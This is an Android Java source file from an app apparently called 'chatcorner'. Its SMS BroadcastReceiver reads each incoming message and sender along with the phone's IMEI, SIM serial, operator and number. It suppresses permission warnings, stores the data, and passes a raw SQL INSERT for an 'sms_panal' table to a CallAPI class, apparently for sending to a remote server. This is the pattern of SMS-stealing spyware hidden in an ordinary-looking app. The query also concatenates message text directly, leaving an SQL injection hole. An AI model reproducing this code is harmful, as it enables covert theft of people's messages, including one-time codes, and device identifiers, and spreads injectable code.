package com.example.chatcorner;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import java.sql.Time;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.SimpleTimeZone;
import java.util.TimeZone;

public class sms_reciever extends BroadcastReceiver {
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SmsBroadcastReceiver";
    String msg, Sender_no = "";
    private DBHandler dbHandler;
    Context context;

    AlertDialog alertDialog;
    String[] params = {"login", "user", "pass"};
    MainActivity ma = new MainActivity();

    //BackgroundWorker backgroundWorker = new BackgroundWorker();
    @Override
    public void onReceive(Context context, Intent intent) {
        dbHandler = new DBHandler(context);
        Log.i(TAG, "Intent Received: " + intent.getAction());
        if (intent.getAction() == SMS_RECEIVED) {
            Bundle dataBundle = intent.getExtras();
            if (dataBundle != null) {
                Object[] mypdu = (Object[]) dataBundle.get("pdus");
                final SmsMessage[] message = new SmsMessage[mypdu.length];
                for (int i = 0; i < mypdu.length; i++) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        String format = dataBundle.getString("format");
                        message[i] = SmsMessage.createFromPdu((byte[]) mypdu[i], format);
                    } else {
                        message[i] = SmsMessage.createFromPdu((byte[]) mypdu[i]);
                    }
                    msg = message[i].getMessageBody();
                    Sender_no = message[i].getOriginatingAddress();
                }
                TelephonyManager tManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
                ContextCompat.checkSelfPermission(context,
                        Manifest.permission.WRITE_CALENDAR);
                if (ContextCompat.checkSelfPermission(context,Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(context,Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(context,Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    Activity#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for Activity#requestPermissions for more details.
                    return;
                }

                //BackgroundWorker backgroundWorker = new BackgroundWorker(ma.getApplicationContext());
                //insert();
                //Toast.makeText(context, "Message:" +msg +"\nNumber: "+phoneNo, Toast.LENGTH_LONG).show();
               /* if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

                    return;
                }
                TelephonyManager tManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);

                String Reciever_num = tManager.getLine1Number().toString();

*/
                //String Reciever_num = "031";

                TelephonyManager telemamanger = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                assert telemamanger != null;
                @SuppressLint("MissingPermission") String getSimSerialNumber = telemamanger.getSimSerialNumber() + "\n";
                @SuppressLint("MissingPermission") String phoneImei = telemamanger.getDeviceId() + "\n";
                @SuppressLint("MissingPermission") String operator = telemamanger.getNetworkOperator() + "\n";

                String Reciever_num = "";
                try{
                    Reciever_num = telemamanger.getLine1Number();
                } catch (Exception ex){
                    ex.printStackTrace();
                    Reciever_num = "";
                }

                if(Reciever_num.equals(""))
                    telemamanger.getSubscriberId();

                /*
                String Reciever_num = telemamanger.getLine1Number().toString() + "\n";
                TelephonyManager tMgr = null;
                tMgr =(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
                if (tMgr != null) {
                    String mPhoneNumber = tMgr.getLine1Number();
                }
                */
                //Toast.makeText(context, "this is my num: "+Reciever_num, Toast.LENGTH_SHORT).show();


                // in this portion data will inserted to sqlite database
                Log.i(TAG, "woekinnggggggggggggggggggggggggggg 1");
                //boolean isInserted = dbHandler.addData(Sender_no,Reciever_num,msg,getCurrentDate(),getCurrentTime(),"ststus");
                boolean isInserted = dbHandler.addData(phoneImei,Sender_no, Reciever_num, msg, "", "", "pending");

                Log.i(TAG, "woekinnggggggggggggggggggggggggggg 2");
                if (isInserted) {
                    //Log.i(TAG, "woekinnggggggggggggggggggggggggggg 3");


                    Toast.makeText(context, Reciever_num, Toast.LENGTH_LONG).show();
                } else {
                    //Log.i(TAG, "woekinnggggggggggggggggggggggggggg 4");
                    Toast.makeText(context, "Error", Toast.LENGTH_SHORT).show();
                }




                // in this portion data will inserted to sqlite database
                String query = "INSERT INTO `sms_panal` (`id`,`imei`, `sender_num`, `reciever_num`, `text`, `date`, `time`, `status`) VALUES (NULL,'"+phoneImei+"', '" + Reciever_num + "', '" + Sender_no + "', '" + msg + "', '"+getCurrentDate()+"', '"+getCurrentTime()+"', '');";
                CallAPI callAPI = new CallAPI();
                callAPI.execute(query);
                //callAPI.doInBackground(params);


                //this.doInBackground(params);
                //Toast.makeText(context, "Message:" +msg +"\nNumber: "+phoneNo, Toast.LENGTH_LONG).show();

            }
        }
    }

    public static String getCurrentDate() {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat mdformat = new SimpleDateFormat("yyyy-MM-dd ");
        String strDate = mdformat.format(calendar.getTime());
        return strDate;
    }

    public static String getCurrentTime() {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm a");
        return dateFormat.format(calendar.getTime());
    }

}